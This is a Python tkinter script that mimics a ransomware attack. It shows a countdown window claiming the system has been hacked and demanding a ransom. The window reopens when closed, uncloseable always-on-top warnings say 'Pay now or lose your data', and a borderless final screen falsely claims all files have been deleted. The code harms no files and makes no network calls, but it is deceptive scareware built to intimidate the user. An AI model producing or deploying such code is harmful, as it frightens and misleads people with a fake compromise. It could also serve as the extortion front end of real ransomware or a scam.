import logging
import tkinter as tk
import threading
import time
from datetime import timedelta, datetime
import sys

class TimerManager:
    _instance = None
    _lock = threading.Lock()

    def __init__(self, duration_minutes):
        self.end_time = datetime.now() + timedelta(minutes=duration_minutes)
        self._lock = threading.Lock()

    @classmethod
    def get_instance(cls, duration_minutes=None):
        with cls._lock:
            if cls._instance is None:
                cls._instance = cls(duration_minutes)
        return cls._instance

    def get_remaining_time(self):
        with self._lock:
            now = datetime.now()
            remaining = self.end_time - now
            return max(remaining, timedelta(0))

def format_timedelta(td):
    total_seconds = int(td.total_seconds())
    hours, remainder = divmod(total_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02}:{minutes:02}:{seconds:02}"

def create_main_window(root):
    app = CountdownWindow(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    return root

class CountdownWindow:
    def __init__(self, root):
        self.root = root
        self.root.title("Countdown Timer")
        self.root.geometry("600x200")

        self.label = tk.Label(root, font=('Helvetica', 32))
        self.label.pack(padx=20, pady=20)

        self.note = tk.Label(
            root,
            text="Your system has been hacked. Pay the ransom before the timer ends.\nDO NOT TRY TO CLOSE THIS WINDOW.",
            font=('Helvetica', 12),
            fg='darkred',
            justify="center"
        )
        self.note.pack(pady=10)

        self.update_timer()

    def update_timer(self):
        remaining = TimerManager.get_instance().get_remaining_time()
        if self.root.winfo_exists() and self.root.winfo_viewable():
            self.label.config(text=format_timedelta(remaining))
        if remaining.total_seconds() <= 0:
            self.root.withdraw()
        else:
            self.root.after(1000, self.update_timer)

    def on_close(self):
        self.root.withdraw()
        threading.Thread(target=self.reopen_on_minute_end, daemon=True).start()

    def reopen_on_minute_end(self):
        last_minute = int(TimerManager.get_instance().get_remaining_time().total_seconds() // 60)
        while True:
            time.sleep(1)
            remaining = TimerManager.get_instance().get_remaining_time()
            current_minute = int(remaining.total_seconds() // 60)
            if current_minute != last_minute:
                self.root.deiconify()
                break

def warning_popup_loop():
    shown_minute = None
    warning_window = None

    while True:
        remaining = TimerManager.get_instance().get_remaining_time()
        total_seconds = remaining.total_seconds()
        current_minute = int(total_seconds // 60)

        if 0 < total_seconds <= 300:
            if (warning_window is None or not warning_window.root.winfo_exists()) and current_minute != shown_minute:
                warning_window = WarningWindow()
                shown_minute = current_minute

        if total_seconds <= 0:
            break
        time.sleep(1)

class WarningWindow:
    def __init__(self):
        self.closed = False
        self.root = tk.Toplevel()
        self.root.title("Warning: Time Running Out")
        self.root.attributes('-topmost', True)
        self.root.attributes('-toolwindow', True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.geometry("500x200")

        self.label = tk.Label(self.root, font=('Helvetica', 24), fg='red')
        self.label.pack(padx=20, pady=20)

        self.note = tk.Label(
            self.root,
            text="Your time is running out. Pay now or lose your data!",
            font=('Helvetica', 12), fg='darkred', justify="center")
        self.note.pack(pady=10)

        self.update_timer()

    def update_timer(self):
        if self.closed:
            return
        remaining = TimerManager.get_instance().get_remaining_time()
        total_seconds = int(remaining.total_seconds())
        import math
        if total_seconds > 60:
            minutes = math.ceil(total_seconds / 60)
            self.label.config(text=f"Only {minutes} minute{'s' if minutes != 1 else ''} remaining!")
        elif total_seconds <= 60:
            if total_seconds % 10 == 0:
                self.label.config(text=f"Only {total_seconds} seconds remaining!")
        if total_seconds <= 0:
            self.root.destroy()
            return
        else:
            self.root.after(1000, self.update_timer)

class FinalWindow:
    def __init__(self):
        self.root = tk.Toplevel()
        self.root.title("💀💀 Time's Up 💀💀")
        self.root.attributes('-topmost', True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.overrideredirect(True)
        self.root.geometry("500x300")

        msg = tk.Label(
            self.root,
            text="💀💀 All your files have been deleted.\nGoodbye. 💀💀",
            font=('Helvetica', 18, 'bold'),
            fg='red',
            bg='black',
            justify='center'
        )
        msg.pack(expand=True, fill='both')

        self.root.after(60000, self.quit_everything)

    def quit_everything(self):
        self.root.destroy()
        sys.exit(0)

def trigger_timeup_and_warning(root):
    warning_thread = threading.Thread(target=warning_popup_loop, daemon=True)
    warning_thread.start()

    while True:
        if TimerManager.get_instance().get_remaining_time().total_seconds() <= 0:
            root.withdraw()
            FinalWindow()
            break
        time.sleep(1)

def start_all(duration_minutes):
    TimerManager.get_instance(duration_minutes)

    root = tk.Tk()
    create_main_window(root)

    threading.Thread(
        target=trigger_timeup_and_warning,
        args=(root,),
        daemon=True
    ).start()

    root.mainloop()
    sys.exit(0)
if __name__ == '__main__':
    start_all(duration_minutes=2)
